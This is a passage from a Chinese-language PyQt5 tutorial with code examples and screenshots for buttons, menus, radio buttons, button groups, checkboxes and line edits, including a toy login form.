<p><img alt="" height="192" src="https://images2.imgbox.com/d3/60/CBEJjT62_o.png" width="971"></p> 
<pre><code>#扁平化
btn.setFlat(True)#不会绘制按钮背景，除非按下按钮</code></pre> 
<h3 id="5.4%20%E9%BB%98%E8%AE%A4%E5%A4%84%E7%90%86">5.4 默认处理</h3> 
<p><img alt="" height="336" src="https://images2.imgbox.com/af/07/MH7ZAX6Q_o.png" width="1096"></p> 
<pre><code># ***************默认设置***************开始
btn1=QPushButton(window)
btn1.setText('按钮1')
btn1.move(200,200)
btn1.resize(100,70)

btn2=QPushButton(window)
btn2.setText('按钮2')
btn2.move(350,200)
btn2.resize(100,70)

#设置btn2为默认点下去
# btn2.setAutoDefault(True)#这个方法并不是一运行就是默认，而是用户点击后才为默认
# print('btn1是否设置为默认状态：',btn1.autoDefault())#False
# print('btn2是否设置为默认状态：',btn2.autoDefault())#True

#这个方法才是直接default
btn2.setDefault(True)
# ***************默认设置***************结束</code></pre> 
<p>展示效果：</p> 
<p><img alt="" height="404" src="https://images2.imgbox.com/b6/2a/rbfgVpI2_o.png" width="374"></p> 
<h3 id="5.5%20%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95">5.5 右键菜单</h3> 
<blockquote> 
 <p><strong>右键菜单：</strong>指的是当用户鼠标右键的时候弹出来的一个菜单。 </p> 
</blockquote> 
<p><img alt="" height="130" src="https://images2.imgbox.com/01/54/q5zEKeJU_o.png" width="1172"></p> 
<pre><code># ***************右键菜单***************开始
class Window(QWidget):
    def contextMenuEvent(self,evt):
        pass

window1=Window()
window1.setWindowTitle('右键菜单')
window1.resize(500,500)

def show_menu(point):
    print('自定义上下文菜单:位置({},{})'.format(point.x(),point.y()))
    menu = QMenu(window1)  # 创建菜单
    # 子菜单：最近打开
    open_recent_menu = QMenu(menu)
    open_recent_menu.setTitle('最近打开')
    # 行为动作：新建  打开  分割线  退出
    # new_action=QAction()
    # new_action.setText('新建')
    # new_action.setIcon(QIcon('图片\文件操作icon\新建文件.png'))
    new_action = QAction(QIcon('图片\文件操作icon\新建文件.png'), '新建', menu)
    new_action.triggered.connect(lambda: print('新建文件'))

    open_action = QAction(QIcon('图片\文件操作icon\打开文件.png'), '打开', menu)
    open_action.triggered.connect(lambda: print('打开文件'))

    exit_action = QAction(QIcon('图片\文件操作icon\退出文件.png'), '退出', menu)
    exit_action.triggered.connect(lambda: print('退出程序'))

    file_action = QAction('PyQt5')

    menu.addAction(new_action)
    menu.addAction(open_action)
    open_recent_menu.addAction(file_action)
    menu.addMenu(open_recent_menu)  # 添加子菜单
    menu.addSeparator()  # 添加分割线
    menu.addAction(exit_action)

    # 执行的时候是传递一个point对象，表示展示在哪个位置
    # # exec_()；展示函数
    # menu.exec_(evt.globalPos())  # globalPos():这个函数的点是相对于窗口的
    # # menu.exec_(evt.pos())#pos():这个函数的点是相对于桌面的

    menu.exec_(point)#相对于桌面的
    # dest_point=window1.map(point)#映射到全局的
    # menu.exec_(dest_point)


window1.setContextMenuPolicy(Qt.CustomContextMenu)
window1.customContextMenuRequested.connect(show_menu)
window1.show()

# ***************右键菜单***************结束
</code></pre> 
<p>显示效果：</p> 
<p><img alt="" height="749" src="https://images2.imgbox.com/62/58/S5PRnsHq_o.png" width="1200"></p> 
<h2 id="6.QCommandLinkButton">6.QCommandLinkButton</h2> 
<blockquote> 
 <p><strong>QCommandLinkButton：</strong>命令连接按钮。</p> 
</blockquote> 
<p><img alt="" height="415" src="https://images2.imgbox.com/dd/06/CcURsfKW_o.png" width="997"></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('QCommandLinkButton使用')
window.resize(500,500)

btn=QCommandLinkButton('标题','描述',window)
#修改标题和描述
btn.setText('标题2')
btn.setDescription('描述...')
btn.setIcon(QIcon('图片\点击.png'))
#读取描述内容
print(btn.description())
window.show()
sys.exit(app.exec_())</code></pre> 
<p>运行效果：</p> 
<p><img alt="" height="345" src="https://images2.imgbox.com/66/e1/mZRDWCZu_o.png" width="322"></p> 
<h2 id="7.QToolButton">7.QToolButton</h2> 
<p><img alt="" height="674" src="https://images2.imgbox.com/94/a6/brNnqipW_o.png" width="1008"></p> 
<blockquote> 
 <p> 工具栏中的按钮一般只显示图标，不显示文字。如果既有文本又有图标，默认只显示图标。</p> 
</blockquote> 
<h3 id="7.1%20%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%9F%BA%E6%9C%AC%E6%98%BE%E7%A4%BA%E6%93%8D%E4%BD%9C%C2%A0">7.1 创建与基本显示操作 </h3> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('QToolButton的使用')
window.resize(500,500)
tb=QToolButton(window)
tb.setText('搜索')#区别QPushButton,QPushButton是既显示文本又显示图标
tb.setIcon(QIcon('图片/搜索.png'))#如果既有文本又有图标，默认只显示图标
tb.setIconSize(QSize(60,60))#修改图标大小
tb.setToolTip('这是一个搜索按钮')#提示信息
window.show()
sys.exit(app.exec_())</code></pre> 
<p>效果显示：</p> 
<p><img alt="" height="404" src="https://images2.imgbox.com/5f/43/0jmM61rc_o.png" width="370"></p> 
<h3 id="7.2%20%E5%B7%A5%E5%85%B7%E6%8C%89%E9%92%AE%E6%A0%B7%E5%BC%8F%E8%AE%BE%E7%BD%AE">7.2 工具按钮样式设置</h3> 
<p><img alt="" height="300" src="https://images2.imgbox.com/8c/0a/fk8w4Eah_o.png" width="1183"></p> 
<pre><code>"""
Qt.ToolButtonIconOnly         仅显示图标
Qt.ToolButtonTextOnly         仅显示文本
Qt.ToolButtonTextBesideIcon   文本显示在图标旁边
Qt.ToolButtonTextUnderIcon    文本显示在图标下面
Qt.ToolButtonFollowStyle      遵循风格
"""
tb.setToolButtonStyle(Qt.ToolButtonTextBesideIcon)
</code></pre> 
<p>效果显示：</p> 
<p><img alt="" height="397" src="https://images2.imgbox.com/11/9f/6Tqo0q1W_o.png" width="369"></p> 
<p></p> 
<pre><code>tb.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)</code></pre> 
<p>显示效果：</p> 
<p><img alt="" height="335" src="https://images2.imgbox.com/98/8b/u3u5nSNU_o.png" width="310"></p> 
<pre><code>tb.setToolButtonStyle(Qt.ToolButtonFollowStyle)</code></pre> 
<p>效果显示： </p> 
<p><img alt="" height="343" src="https://images2.imgbox.com/09/e9/KyANQMiV_o.png" width="318"></p> 
<h3 id="7.3%20%E7%AE%AD%E5%A4%B4%E7%B1%BB%E5%9E%8B%E6%93%8D%E4%BD%9C">7.3 箭头类型操作</h3> 
<p><img alt="" height="309" src="https://images2.imgbox.com/b4/37/UNBOzPxd_o.png" width="921"></p> 
<blockquote> 
 <p>箭头优先级高于图片优先级，高于文本优先级。即如果三者同时出现，会值显示箭头。 </p> 
</blockquote> 
<pre><code>tb=QToolButton(window)
"""
Qt.NoArrow      无箭头
Qt.UpArrow      上箭头
Qt.DownArrow    下箭头
Qt.LeftArrow    左箭头
Qt.RightArrow   右箭头
"""
tb.setArrowType(Qt.NoArrow)</code></pre> 
<p>运行效果：</p> 
<p><img alt="" height="358" src="https://images2.imgbox.com/d1/4e/QNd9TvFq_o.png" width="330"></p> 
<pre><code>tb.setArrowType(Qt.UpArrow)</code></pre> 
<p>运行效果：<br><img alt="" height="341" src="https://images2.imgbox.com/ee/36/w3GkjTIJ_o.png" width="321"></p> 
<pre><code>tb.setArrowType(Qt.LeftArrow)</code></pre> 
<p>运行效果：<br><img alt="" height="177" src="https://images2.imgbox.com/15/66/UIGwK9Vd_o.png" width="310"></p> 
<p></p> 
<pre><code>tb=QToolButton(window)
tb.setText('箭头')
tb.setArrowType(Qt.LeftArrow)
tb.setToolButtonStyle(Qt.ToolButtonTextBesideIcon)</code></pre> 
<p> 结果显示：</p> 
<p> <img alt="" height="205" src="https://images2.imgbox.com/5f/2a/ajdkMVj2_o.png" width="447"></p> 
<h3 id="7.4%20%E8%87%AA%E5%8A%A8%E6%8F%90%E5%8D%87%E5%8A%9F%E8%83%BD">7.4 自动提升功能</h3> 
<p><img alt="" height="200" src="https://images2.imgbox.com/3f/ea/w0IqMqll_o.png" width="711"></p> 
<pre><code>tb=QToolButton(window)
tb.setText('搜索')#区别QPushButton,QPushButton是既显示文本又显示图标
tb.setIcon(QIcon('图片/搜索.png'))#如果既有文本又有图标，默认只显示图标
tb.setIconSize(QSize(60,60))#修改图标大小
tb.setToolTip('这是一个搜索按钮')#提示信息
tb.setToolButtonStyle(Qt.ToolButtonTextBesideIcon)
tb.setAutoRaise(True)#设置扁平化：当鼠标放上去的时候，显示凸起
</code></pre> 
<p>显示效果：</p> 
<p><img alt="" height="296" src="https://images2.imgbox.com/9e/0e/YO7LeHt8_o.png" width="279">  <img alt="" height="298" src="https://images2.imgbox.com/aa/c0/OqBDRYCS_o.png" width="279"> </p> 
<h3 id="7.5%20%E8%8F%9C%E5%8D%95%E5%92%8C%E5%BC%B9%E5%87%BA%E6%A8%A1%E5%BC%8F">7.5 菜单和弹出模式</h3> 
<p><img alt="" height="358" src="https://images2.imgbox.com/66/e1/3gav6zHM_o.png" width="1200"></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('QToolButton的使用')
window.resize(500,500)
tb=QToolButton(window)
tb.setArrowType(Qt.RightArrow)
tb.setText('箭头')
tb.setToolButtonStyle(Qt.ToolButtonTextBesideIcon)
btn=QPushButton(window)
btn.setText('一般按钮')
btn.move(100,100)
btn.setFlat(True)
menu=QMenu(btn)
#menu.setTitle('菜单')
sub_menu=QMenu(menu)
sub_menu.setTitle('子菜单')
sub_menu.setIcon(QIcon('图片/文件操作icon/文件.png'))
action=QAction(QIcon('图片/文件操作icon/新建文件.png'),'行为',menu)
action.triggered.connect(lambda :print('点击了行为菜单选项'))
menu.addMenu(sub_menu)
menu.addSeparator()
menu.addAction(action)

tb.clicked.connect(lambda:print('工具按钮被点击了'))
tb.setMenu(menu)
"""
QToolButton.DelayedPopup      鼠标按住一会才显示,类似于浏览器后退按钮
QToolButton.MenuButtonPopup   有一个专门的指示箭头,点击箭头才显示
QToolButton.InstantPopup      点了按钮就显示,点击信号不会发射
"""
tb.setPopupMode(QToolButton.MenuButtonPopup)

window.show()
sys.exit(app.exec_())</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="367" src="https://images2.imgbox.com/d3/ff/OCCi5E8i_o.png" width="332"></p> 
<h3 id="7.6%20%E5%8F%AF%E7%94%A8%E4%BF%A1%E5%8F%B7">7.6 可用信号</h3> 
<p><img alt="" height="154" src="https://images2.imgbox.com/77/7b/hbv0KYwo_o.png" width="910"></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('QToolButton的使用')
window.resize(500,500)
tb=QToolButton(window)
tb.setText('箭头')
tb.setArrowType(Qt.RightArrow)
tb.setToolButtonStyle(Qt.ToolButtonTextBesideIcon)
btn=QPushButton(window)
btn.setText('一般按钮')
btn.move(100,100)
btn.setFlat(True)
menu=QMenu(btn)
#menu.setTitle('菜单')
sub_menu=QMenu(menu)
sub_menu.setTitle('子菜单')
sub_menu.setIcon(QIcon('图片/文件操作icon/文件.png'))
action=QAction(QIcon('图片/文件操作icon/新建文件.png'),'新建文件',menu)
action.setData([1,2,3])

action2=QAction(QIcon('图片/文件操作icon/删除文件.png'),'删除文件',menu)
action2.setData({'name':'张'})

action.triggered.connect(lambda :print('点击了新建文件选项'))
menu.addMenu(sub_menu)
menu.addSeparator()
menu.addAction(action)
menu.addAction(action2)
tb.clicked.connect(lambda:print('工具按钮被点击了'))
tb.setMenu(menu)
tb.setPopupMode(QToolButton.MenuButtonPopup)

def do_action(action):
    print('点击了行为',action.data())
tb.triggered.connect(do_action)

window.show()
sys.exit(app.exec_())
</code></pre> 
<p>结果展示：</p> 
<p><img alt="" height="541" src="https://images2.imgbox.com/fd/9d/Jzc3kzBK_o.png" width="994"></p> 
<h2 id="8.QRadioButton%E5%8D%95%E9%80%89%E6%A1%86">8.QRadioButton单选框</h2> 
<p><img alt="" height="385" src="https://images2.imgbox.com/e8/70/Lp1zVV7G_o.png" width="947"></p> 
<blockquote> 
 <p>用于给用户提供单选操作。 一旦选中一个，会自动取消上次所选按钮。</p> 
</blockquote> 
<h3 id="8.1%20%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%9F%BA%E6%9C%AC%E8%AE%BE%E7%BD%AE%C2%A0">8.1 创建与基本设置 </h3> 
<p><img alt="" height="197" src="https://images2.imgbox.com/45/39/WntJbmnU_o.png" width="608"></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('QradioButton功能测试')
window.resize(500,500)

rb_nan=QRadioButton('男-&amp;Male',window)#设置快捷键：通过快捷键选中 alt+M   ==&gt;或者  rb_nan.setShortcut('alt+m')
rb_nan.move(100,100)
rb_nan.setIcon(QIcon('图片/男.png'))
rb_nan.setIconSize(QSize(60,60))

rb_nv=QRadioButton('女-&amp;Female',window)#alt+F
rb_nv.move(100,170)#上下排
rb_nv.setIcon(QIcon('图片/女.png'))
rb_nv.setIconSize(QSize(60,60))

#设置默认选中
rb_nan.setChecked(True)

window.show()
sys.exit(app.exec_())</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="354" src="https://images2.imgbox.com/f1/b1/PNbyeJuH_o.png" width="329"></p> 
<h3 id="8.2%20%E4%BF%A1%E5%8F%B7%E4%BD%BF%E7%94%A8">8.2 信号使用</h3> 
<p><img alt="" height="101" src="https://images2.imgbox.com/ca/eb/bbHOqsgW_o.png" width="418"></p> 
<p><img alt="" height="168" src="https://images2.imgbox.com/32/06/PgSWgmvS_o.png" width="512"></p> 
<blockquote> 
 <p>常用最后一个切换信号。toggled</p> 
</blockquote> 
<pre><code>#监听切换信号
rb_nv.toggled.connect(lambda isChecked:print(isChecked))#会打印状态，若rb_nv处于选中状态，就是True

#设置两个选项互不影响  即点击的时候不会取消其他的选项
rb_nv.setAutoExclusive(False)</code></pre> 
<h3 id="8.3%20%E5%A4%9A%E7%BB%84%E4%BA%92%E6%96%A5%E9%97%AE%E9%A2%98">8.3 多组互斥问题</h3> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('QradioButton功能测试')
window.resize(500,500)

#设置两组(男女，对错)互斥
red=QWidget(window)
red.setStyleSheet('background-color:red;')
red.move(50,50)
red.resize(200,200)

green=QWidget(window)
green.setStyleSheet('background:green;')
green.move(red.x()+red.width(),red.y()+red.height())
green.resize(200,200)


rb_nan=QRadioButton('男-&amp;Male',red)
rb_nan.move(70,70)
rb_nan.setChecked(True)

rb_nv=QRadioButton('女-&amp;Female',red)#alt+F
rb_nv.move(70,100)


rb_nan.setChecked(True)

rb_yes=QRadioButton('yes',green)
rb_yes.move(70,70)

rb_no=QRadioButton('no',green)
rb_no.move(70,100)

#默认选中rb_yes
rb_yes.setChecked(True)


window.show()
sys.exit(app.exec_())</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="385" src="https://images2.imgbox.com/a5/fa/aBvkTEHo_o.png" width="355"></p> 
<h2 id="9.QButtonGroup">9.QButtonGroup</h2> 
<p><img alt="" height="439" src="https://images2.imgbox.com/f0/ec/JBsu4I7h_o.png" width="757"></p> 
<blockquote> 
 <p>多个按钮划分一组。不具备可视化效果。 </p> 
</blockquote> 
<h3 id="9.1%20%E5%88%9B%E5%BB%BA%E5%92%8C%E6%B7%BB%E5%8A%A0%E6%8C%89%E9%92%AE%C2%A0">9.1 创建和添加按钮 </h3> 
<p><img alt="" height="129" src="https://images2.imgbox.com/ff/07/r74K4Giw_o.png" width="934"></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('按钮组的使用')
window.resize(500,500)

#男女
rt_male=QRadioButton('男',window)
rt_male.move(100,100)
rt_female=QRadioButton('女',window)
rt_female.move(100,150)
rt_male.setChecked(True)
#设置一组
sex_group=QButtonGroup(window)
sex_group.addButton(rt_male)
sex_group.addButton(rt_female)

#对错
rt_yes=QRadioButton('对',window)
rt_yes.move(300,100)
rt_no=QRadioButton('错',window)
rt_no.move(300,150)
rt_yes.setChecked(True)
answer_group=QButtonGroup(window)
answer_group.addButton(rt_yes)
answer_group.addButton(rt_no)

window.show()
sys.exit(app.exec_())
</code></pre> 
<p>效果展示：</p> 
<p><img alt="" height="396" src="https://images2.imgbox.com/df/54/IPIbt5BM_o.png" width="371"></p> 
<h3 id="9.2%20%E6%9F%A5%E7%9C%8B%E6%8C%89%E9%92%AE">9.2 查看按钮</h3> 
<p><img alt="" height="161" src="https://images2.imgbox.com/70/ae/6dyBtfQt_o.png" width="664"></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('按钮组的使用')
window.resize(500,500)


#男女
rt_male=QRadioButton('男',window)
rt_male.move(100,100)
rt_female=QRadioButton('女',window)
rt_female.move(100,150)
rt_male.setChecked(True)
#设置一组
sex_group=QButtonGroup(window)
sex_group.addButton(rt_male,id=1)#指定id,如果id为-1，则将为该按钮分配一个id。自动分配的ID保证为负数，从-2开始。
sex_group.addButton(rt_female,id=2)


print('sex_group组成员：',sex_group.buttons())
print('sex_group组种第一个成员：',sex_group.button(1))
print('sex_group组中被选中多个成员是：',sex_group.checkedButton())


window.show()
sys.exit(app.exec_())
</code></pre> 
<p>运行效果：</p> 
<p><img alt="" height="415" src="https://images2.imgbox.com/41/de/IA92yrBN_o.png" width="1200"></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('按钮组的使用')
window.resize(500,500)

# ***************创建与添加按钮***************开始
#男女
rt_male=QRadioButton('男',window)
rt_male.move(100,100)
rt_female=QRadioButton('女',window)
rt_female.move(100,150)
rt_male.setChecked(True)
#设置一组
sex_group=QButtonGroup(window)
sex_group.addButton(rt_male,id=1)#指定id,如果id为-1，则将为该按钮分配一个id。自动分配的ID保证为负数，从-2开始。
sex_group.addButton(rt_female,id=2)

#对错
rt_yes=QRadioButton('对',window)
rt_yes.move(300,100)
rt_no=QRadioButton('错',window)
rt_no.move(300,150)
rt_yes.setChecked(True)
answer_group=QButtonGroup(window)
answer_group.addButton(rt_yes)
answer_group.addButton(rt_no)
# ***************创建与添加按钮***************结束

# ***************查看按钮***************开始
print('sex_group组成员：',sex_group.buttons())
print('sex_group组种第一个成员：',sex_group.button(1))
print('sex_group组中被选中多个成员是：',sex_group.checkedButton())
# ***************查看按钮***************结束


window.show()
sys.exit(app.exec_())
</code></pre> 
<h3 id="9.3%20%E7%A7%BB%E9%99%A4%E7%BB%84%E5%85%B3%E7%B3%BB">9.3 移除组关系</h3> 
<p><img alt="" height="161" src="https://images2.imgbox.com/f3/98/oRbV9QUL_o.png" width="699"></p> 
<blockquote> 
 <p>移除组关系。并不是移除按钮</p> 
</blockquote> 
<pre><code>#移除组关系
sex_group.removeButton(rt_female)</code></pre> 
<p> 运行结果：</p> 
<p><img alt="" height="319" src="https://images2.imgbox.com/fc/a8/E28qzLjs_o.png" width="297"></p> 
<h3 id="9.4%20%E7%BB%91%E5%AE%9A%E5%92%8C%E8%8E%B7%E5%8F%96ID">9.4 绑定和获取ID</h3> 
<p><img alt="" height="194" src="https://images2.imgbox.com/32/de/bpFMmuL1_o.png" width="576"></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('按钮组的使用')
window.resize(500,500)

#对错
rt_yes=QRadioButton('对',window)
rt_yes.move(300,100)
rt_no=QRadioButton('错',window)
rt_no.move(300,150)
rt_no.setChecked(True)
answer_group=QButtonGroup(window)
answer_group.addButton(rt_yes)
answer_group.addButton(rt_no)

#绑定ID
answer_group.setId(rt_yes,1)
answer_group.setId(rt_no,2)
#获取ID
print('rt_yes的ID:',answer_group.id(rt_yes))
print('rt_no的ID:',answer_group.id(rt_no))
print('当前选中的id为：',answer_group.checkedId())

window.show()
sys.exit(app.exec_())</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="365" src="https://images2.imgbox.com/d7/de/v2u2ruHQ_o.png" width="341"></p> 
<h3 id="9.5%20%E7%8B%AC%E5%8D%A0%E6%93%8D%E4%BD%9C">9.5 独占操作</h3> 
<p><img alt="" height="163" src="https://images2.imgbox.com/62/1d/XlvDgBwf_o.png" width="691"></p> 
<pre><code>#独占操作
answer_group.setExclusive(False)</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="391" src="https://images2.imgbox.com/35/bc/24OTArPP_o.png" width="367"></p> 
<h3 id="9.6%20%E4%BF%A1%E5%8F%B7%E4%BD%BF%E7%94%A8">9.6 信号使用</h3> 
<p><img alt="" height="312" src="https://images2.imgbox.com/ed/ae/SC3GgpTd_o.png" width="840"></p> 
<pre><code>answer_group.buttonToggled.connect(lambda :print('对错按钮切换'))#这个会打印两次，因为切换是两个操作

def test(val):
    print(answer_group.id(val))#获取id
answer_group.buttonClicked.connect(test)
#或者
sex_group.buttonClicked[int].connect(lambda info:print(info))#过滤出int类型的信息  id</code></pre> 
<h2 id="10.QCheckBox%E5%A4%9A%E9%80%89%E6%A1%86">10.QCheckBox多选框</h2> 
<p><img alt="" height="455" src="https://images2.imgbox.com/c7/1d/kndTbcij_o.png" width="954"></p> 
<blockquote> 
 <p>复选框：三种状态，未选中，部分选中，真的被选中。setTristate(True) </p> 
</blockquote> 
<h3 id="10.1%20%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8">10.1 功能使用</h3> 
<p><img alt="" height="525" src="https://images2.imgbox.com/e5/fa/GnbBBKjS_o.png" width="747"></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('QCheckBox功能测试')
window.resize(500,500)

#查看父类
print('QCheckBox的父类：',QCheckBox.__bases__)#QAbstractButton

cb=QCheckBox('&amp;python',window)#快捷键 alt+p  ==&gt; cb.setShortcut('alt+p')
cb.setIcon(QIcon('图片/赞同.png'))
cb.setIconSize(QSize(60,60))

#设置三态
cb.setTristate(True)
print('是否是三态：',cb.isTristate())

#设置复选框状态,因为是三态，所以不可以通过设置True/false来设定
"""  
Qt.Unchecked           未选中
Qt.PartiallyChecked    部分选中
Qt.Checked             选中 
"""
cb.setCheckState(Qt.PartiallyChecked )

window.show()
sys.exit(app.exec_())</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="504" src="https://images2.imgbox.com/dc/5d/dWVtZT1k_o.png" width="350"></p> 
<h3 id="10.2%20%E4%BF%A1%E5%8F%B7">10.2 信号</h3> 
<p><img alt="" height="89" src="https://images2.imgbox.com/15/ee/p92r9JpO_o.png" width="640"></p> 
<pre><code>#信号
cb.stateChanged.connect(lambda state:print(state))#打印三种状态0 1 2
cb.toggled.connect(lambda isChecked:print(isChecked))#这个只有True和False,把半选和全选当成一种状态</code></pre> 
<h2 id="11.QLineEdit">11.QLineEdit</h2> 
<p><img alt="" height="457" src="https://images2.imgbox.com/de/d2/5bIsFQiQ_o.png" width="572"></p> 
<h3 id="11.1%20%E6%8E%A7%E4%BB%B6%E5%88%9B%E5%BB%BA%E3%80%81%E6%96%87%E6%9C%AC%E7%9A%84%E8%AE%BE%E7%BD%AE%E8%8E%B7%E5%8F%96">11.1 控件创建、文本的设置获取</h3> 
<p><img alt="" height="279" src="https://images2.imgbox.com/c1/e9/vKg2L0pp_o.png" width="1037"></p> 
<pre><code>from PyQt5.Qt import *
import sys

app=QApplication(sys.argv)
window=QWidget()
window.setWindowTitle('QLineEdit功能测试')
window.resize(500,500)

print('QLineEdit继承：',QLineEdit.__base__)#QWidget
le=QLineEdit('姓名：',window)#单行文本编辑
#le=QLineEdit('姓名：',window)   ==&gt;  '姓名：'会出现在文本框里作为提示符
"""
setText(str)        设置内容文本
insert(newText)     在光标处插入文本
text()              获取真实内容文本【比如：输入密码的时候，都是点点掩饰，此刻就应该用text()获取，而非displayText】
displayText()       获取用户能看到的内容文本【display()看到什么就获取什么，比如点点】
"""
le.setText('用户名：')
le.setText('年龄：')#此刻会将上行的'用户名：'覆盖
le.insert('20')#会在光标出插入，不会覆盖上述


btn=QPushButton(window)
btn.setText('按钮')
btn.move(100,100)
btn.pressed.connect(lambda :print(le.text()))#获取内容并打印

window.show()
sys.exit(app.exec_())</code></pre> 
<p>效果展示：</p> 
<p><img alt="" height="257" src="https://images2.imgbox.com/94/76/6aHFQ1So_o.png" width="443"></p> 
<p>案例：</p> 
<p><img alt="" height="111" src="https://images2.imgbox.com/1e/36/vGf6eUYE_o.png" width="874"></p> 
<pre><code>le_a=QLineEdit('a:',window)
le_a.move(100,100)
le_a.resize(150,30)

le_b=QLineEdit('b:',window)
le_b.move(100,200)
le_b.resize(150,30)


copy_btn=QPushButton(window)
copy_btn.setText('复制')
copy_btn.move(100,350)
def copy_text():
    print('开始复制......')
    info=le_a.text()
    le_b.setText(info)
copy_btn.pressed.connect(copy_text)
</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="331" src="https://images2.imgbox.com/1a/fa/M1U4VRgY_o.png" width="546"></p> 
<h3 id="11.2%20%E8%BE%93%E5%87%BA%E6%A8%A1%E5%BC%8F">11.2 输出模式</h3> 
<p><img alt="" height="606" src="https://images2.imgbox.com/61/5b/QVqsLnB7_o.png" width="1200"></p> 
<p></p> 
<pre><code># ***************输出模式设置***************开始
"""
输出模式的几个枚举变量：
    LeadingPosition=0
    NoEcho=1   没有显示【类似于Linux操作系统下的输入密码】
    Normal=0
    Password=2
    PasswordEchoOnEdit=3    编辑的时候是明文，编辑结束后是暗文
    TrailingPosition=1
"""
le_a=QLineEdit('a:',window)
le_a.move(100,100)
le_a.resize(150,30)
le_a.setEchoMode(QLineEdit.Password)

le_b=QLineEdit('b:',window)
le_b.move(100,200)
le_b.resize(150,30)
le_b.setEchoMode(QLineEdit.PasswordEchoOnEdit)

btn_a=QPushButton('按钮a',window)
btn_a.move(70,350)
def cao_a():
    print('读出le_a的Password模式下的内容text():：',print(le_a.text()))
    print('读出le_a的Password模式下的内容displayText():：', print(le_a.displayText()))
btn_a.pressed.connect(cao_a)

btn_b=QPushButton('按钮b',window)
btn_b.move(200,350)
def cao_b():
    print('读出le_b的PasswordEchoOnEdit模式下的内容：',print(le_b.text()))
btn_b.pressed.connect(cao_b)

# ***************输入模式设置***************结束</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="554" src="https://images2.imgbox.com/66/c2/jESp0ozo_o.png" width="1200">案例：</p> 
<p><img alt="" height="314" src="https://images2.imgbox.com/77/f0/birq6Lmo_o.png" width="1065"></p> 
<pre><code>from PyQt5.Qt import *
import sys

class Window(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('登陆界面')
        self.resize(500,500)
        self.setMinimumSize(400, 400)  # 设置最小尺寸,防止拖窗口把几个控件拖没，不好看
        self.setup_ui()


    def setup_ui(self):

        #添加三个控件
        self.account_le=QLineEdit(self)
        self.pwd_le=QLineEdit(self)
        self.pwd_le.setEchoMode(QLineEdit.Password)
        self.login_btn=QPushButton('     登   录     ',self)

        self.login_btn.clicked.connect(self.login_cao)

    def login_cao(self):
        #获取账号信息
        account=self.account_le.text()
        pwd=self.pwd_le.text()
        if account=='root':
            if pwd=='123456':
                print('登陆成功')
            else:
                print('密码错误，请重新输入！')
                self.pwd_le.setText('')
                self.pwd_le.setFocus()#清空后光标仍在该处
        else:
            print('用户名错误！,请重新输入！')
            self.account_le.setText('')
            self.pwd_le.setText('')
            self.account_le.setFocus()

    def resizeEvent(self,evt):
        widget_w = 150  # 每一个控件的宽度
        widget_h = 40  # 每一个控件的高度
        margin = 60  # 每一个控件之间的间距
        self.account_le.resize(widget_w, widget_h)
        self.pwd_le.resize(widget_w, widget_h)
        self.login_btn.resize(widget_w, widget_h)

        # 设置在正中间
        x = int((self.width() - widget_w) / 2)
        self.account_le.move(x, int(self.height() / 5))
        self.pwd_le.move(x, self.account_le.y() + widget_h + margin)
        self.login_btn.move(x, self.pwd_le.y() + widget_h + margin)

if __name__=='__main__':
    app = QApplication(sys.argv)
    window = Window()
    window.show()
    sys.exit(app.exec_())</code></pre> 
<p>运行效果：</p> 
<p><img alt="" height="346" src="https://images2.imgbox.com/7e/9b/YI19zhNf_o.png" width="547"></p> 
<h3 id="11.3%20%E5%8D%A0%E4%BD%8D%E6%96%87%E6%9C%AC%E8%AE%BE%E7%BD%AE">11.3 占位文本设置</h3> 
<p><img alt="" height="240" src="https://images2.imgbox.com/f9/9a/wEdFvrSh_o.png" width="704"></p> 
<blockquote> 
 <p>作用：提示用户输入信息。当真正内容输入之后，占位文本就会消失。</p> 
</blockquote> 
<pre><code>#占位文本的提示
self.account_le.setPlaceholderText('请输入账号')
self.pwd_le.setPlaceholderText('请输入密码')</code></pre> 
<h3 id="11.4%20%E6%B8%85%E7%A9%BA%E6%8C%89%E9%92%AE%E7%9A%84%E8%AE%BE%E7%BD%AE">11.4 清空按钮的设置</h3> 
<p><img alt="" height="157" src="https://images2.imgbox.com/8e/9f/dgTIvwLj_o.png" width="669"></p> 
<blockquote> 
 <p>提供快速删除按钮。 </p> 
</blockquote> 
<pre><code>#设置密码文本框自动快速清空按钮
self.pwd_le.setClearButtonEnabled(True)</code></pre> 
<p>效果展示：</p> 
<p><img alt="" height="357" src="https://images2.imgbox.com/d1/d8/9a6FoR9v_o.png" width="323"></p> 
<h3 id="11.5%20%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A1%8C%E4%B8%BA">11.5 添加自定义行为</h3> 
